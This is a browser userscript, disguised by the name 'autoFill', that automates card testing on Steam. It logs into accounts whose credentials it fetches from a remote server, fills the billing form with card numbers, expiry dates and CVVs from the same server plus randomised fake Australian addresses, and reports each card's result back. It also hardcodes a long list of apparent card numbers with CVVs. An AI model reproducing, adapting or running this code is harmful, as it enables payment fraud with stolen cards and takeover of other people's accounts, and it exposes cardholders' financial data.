// ==UserScript==
// @name         autoFill
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  trsss
// @author       You
// @match        https://*.steampowered.com/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=steampowered.com
// @grant		 unsafeWindow
// @grant		 GM_setValue
// @grant		 GM_getValue
// @grant		 GM_xmlhttpRequest
// @connect      qxw1649450282.my3w.com
// @downloadURL https://update.greasyfork.org/scripts/473355/autoFill.user.js
// @updateURL https://update.greasyfork.org/scripts/473355/autoFill.meta.js
// ==/UserScript==

(function() {
    'use strict';
//========================================================================


   window.zzzcards=['4147099498081726--09--27--441','4239530072980700--08--24--423','4239530072980700--08--24--168','4147099498081726--09--27--441','5217291906902369--12--25--919','4585940062204195--08--25--388','5163610098352014--06--24--937','4585940062204195--08--25--445','4017954104599420--12--26--073','5217295351977023--09--24--143','5218295351077023--09--24--143','5217295400576256--09--26--926','5353185286127775--01--26--648','4564699023654303--07--26--699','4017954196172721--10--26--587','5353165302132801--08--25--666','5217295400430579--05--26--238','5217291896335588--01--25--369','5217295359440256--01--25--285','4564627125643346--3--202--743','5444345303143574--11--26--735','4622391105434768--11--26--832','5217295394684520--10--26--719','4557012054547512--05--25--263','5217295331266415--12--23--534','5217295389506084--05--26--028','5188680701849566--01--26--122','4564571063757025--06--27--228','5163610223756253--03--27--874','4017954194473014--06--26--028','5217295369983717--10--25--959','5217291920879643--01--27--388','4434380012221507--01--26--463','5217295387364841--01--26--602','5217291920879643--01--27--388','5217295351068055--09--24--179','5353185285691391--12--24--361','4622391012448091--7--202--684','5217291920850768--07--26--065','4622393003747754--07--27--856','5188680122967294--05--24--229','5163610096603152--10--23--500','4017954187660320--09--26--888','5163103007327145--09--24--299','5217291915537101--08--26--769','4622391106453648--11--26--224','1254012464842791--08--26--358'];


//=====================================================================
function ReactInput(node,strVal){
    if(node){
        let nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
        nativeInputValueSetter.call(node,strVal);
        let evt = new Event('input', { bubbles: true});
        node.dispatchEvent(evt);
    }
}
function roll(min,max){
	return Math.floor(Math.random() * (max - min + 1)) + min;
}
//==========================================
     if(location.href.indexOf('store.steampowered.com/login/')>-1){

        var loopTimerID = setInterval(function(){

			if(document.querySelector('button[type="submit"]')){clearInterval(loopTimerID);}else{return 0;};

			GM_xmlhttpRequest({
				 method: 'GET',
				 url: 'http://qxw1649450282.my3w.com/jobs/acc.asp?act=get',   //getcard/http://qxw1649450282.my3w.com/jobs/cc.asp?act=get
				 headers: { "Content-Type": "text/html,charset=utf-8" },
				 onload: function(response) {
					 // [OK]----lwcvk850----nids87769M----1
					 //alert(response.responseText);
					 var lineArr= response.responseText.split('----');
					 var s_user = lineArr[1];
					 var s_pass = lineArr[2];
					 
					 setTimeout(function(){ 
				
						ReactInput(document.querySelector('input[type="text"]'),s_user);
						ReactInput(document.querySelector('input[type="password"]'),s_pass)
						
						document.querySelector('button[type="submit"]').click();
						document.title='login Done!';
						},2000);
						
						
					 
					 

				 }
			}); 


		},500);

     }
//======================================================================
   if(location.href=='https://store.steampowered.com' || location.href=='https://store.steampowered.com/'){

        var loopTimerID2 = setInterval(function(){

			if(document.querySelector('span#account_pulldown')){clearInterval(loopTimerID2);}else{return 0;};

			location.href='https://store.steampowered.com/account/?snr=1_4_4__global-header';


		},500);

     }
//========================================================================
   if(location.href.indexOf('store.steampowered.com/account')>-1){

	var loopTimerID3 = setInterval(function(){

		if(document.querySelector('div.account_setting_sub_block>a.account_manage_link:not([data-panel])')){clearInterval(loopTimerID3);}else{return 0;};

			var eleDelCard = document.querySelector('div.payment_method_box>table>tbody>tr>td:nth-child(4)>a');		
			if( eleDelCard ){
				
				var successCardNo = GM_getValue('currCardNo');
				if(successCardNo){
					document.title = successCardNo + '--OK!';
					GM_xmlhttpRequest({
						 method: 'GET',
						 url: 'http://qxw1649450282.my3w.com/jobs/ccset.asp?cc='+successCardNo+'&ret=SteamTestOK',   //getcard
						 headers: { "Content-Type": "text/html,charset=utf-8" },
						 onload: function(response) { eleDelCard.click(); /*setTimeout(function(){location.reload()},2000);*/  }
					})
				}
				
			 }else{
				document.querySelector('div.account_setting_sub_block>a.account_manage_link:not([data-panel])').click(); //addcard
			 }
		},500);
   }

    //=====================================================================

   if(location.href.indexOf('steampowered.com/checkout/?purchasetype=updatebillinginfo')>-1){

	var loopTimerID4 = setInterval(function(){

		if(document.querySelector('input#billing_phone')){clearInterval(loopTimerID4);}else{return 0;};
			   
			GM_xmlhttpRequest({
				 method: 'GET',
				 url: 'http://qxw1649450282.my3w.com/jobs/cc.asp?act=get',   //getcard
				 headers: { "Content-Type": "text/html,charset=utf-8" },
				 onload: function(response) {
					 // 4147099498081726----09----2027----441----Atherine----Moffitt
					
					 if(response.responseText.indexOf('----')<0) alert(response.responseText);
					 
					 var ccinfoArr= response.responseText.split('----');
					 var ccno = ccinfoArr[0];
					 var ccmonth = ccinfoArr[1];
					 var ccyear = ccinfoArr[2];
					 var ccvc = ccinfoArr[3];
					 var firstname = ccinfoArr[4];
					 var lastname = ccinfoArr[5];
					 

					unsafeWindow.DHighlightItem('payment_method',1,true);//select mastcard
					unsafeWindow.jQuery('#card_number').val(ccno);
					unsafeWindow.DHighlightItem( 'expiration_month', parseInt(ccmonth), true );
					unsafeWindow.DHighlightItem( 'expiration_year', parseInt(ccyear)-2022, true );
					unsafeWindow.jQuery('#security_code').val(ccvc);
					
					
					// jQuery('#billing_country_droplist>li>a#AU');
					
					if(document.querySelector('#billing_phone').value==''|| document.querySelector('#first_name').value==''){
						let aucities=['Sydney','Melbourne','Brisbane','Perth','Adelaide','Hobart'];
						let aupostcodes=['2000','3000','4702','6000','5000','7000'];
						let auaddress01es=['Queen Victoria Street','King Willam Rd.','Council Road','Strachan Street','Market Street','Gallery Rd'];
						let auaddresses=['Park','Plaza','Centre','Building','Suite','Town'];
						let auNames=['Robert','Cathy','Edward','Jackson','Lucas','Will'];
						let rndIndex = roll(0,5);
						
						unsafeWindow.jQuery('#first_name').val(auNames[roll(0,5)]);
						unsafeWindow.jQuery('#last_name').val(auNames[roll(0,5)]);						
						
						unsafeWindow.jQuery('#billing_phone').val(roll(12345678,999999999));
						unsafeWindow.jQuery('#billing_city').val(aucities[rndIndex]);
						unsafeWindow.jQuery('#billing_postal_code').val(aupostcodes[rndIndex]);						
						unsafeWindow.jQuery('#billing_address').val(''+roll(10,999)+' '+auaddress01es[roll(0,5)]);
						unsafeWindow.jQuery('#billing_address_two').val(auaddresses[roll(0,5)]+roll(1,99)+' bulk'+roll(10,999));

					}
					
					document.querySelector('a#submit_payment_info_btn.continue').click();
					GM_setValue('currCardNo',ccno);
						
						
					
						
					var loopTimerID9 = setInterval(function(){
						if((document.querySelector('a#submit_payment_info_btn.continue').style.display=='block' && document.querySelectorAll('#error_display').length > 0) || (location.href.indexOf('store.steampowered.com/account')>-1) ){clearInterval(loopTimerID9);}else{return 0;};

						if(document.querySelector('#error_display')){
					 
							let errorInfo=document.querySelector('#error_display').innerText;
							//alert(ccno+': '+errorInfo);
							if( errorInfo.indexOf('lease wait')>-1) alert(errorInfo);
							GM_xmlhttpRequest({
								 method: 'GET',
								 url: 'http://qxw1649450282.my3w.com/jobs/ccset.asp?cc='+ccno+'&ret='+errorInfo.replace(/[^a-zA-Z0-9]/g,'').substr(-60),   //getcard
								 headers: { "Content-Type": "text/html,charset=utf-8" },
								 responseType:'arraybuffer',
								 onload: function(response) {  
									let respdecoder = new TextDecoder('gb2312');
									let cleartext = respdecoder.decode(response.response);  
									if(response.status!=200) alert(cleartext);
									location.reload(); }
							})
							//location.reload();
						}
						 
					},2000);

				 }
			}); 
			   
			   
			   
		},500);
   }




    //=====================================================================




})();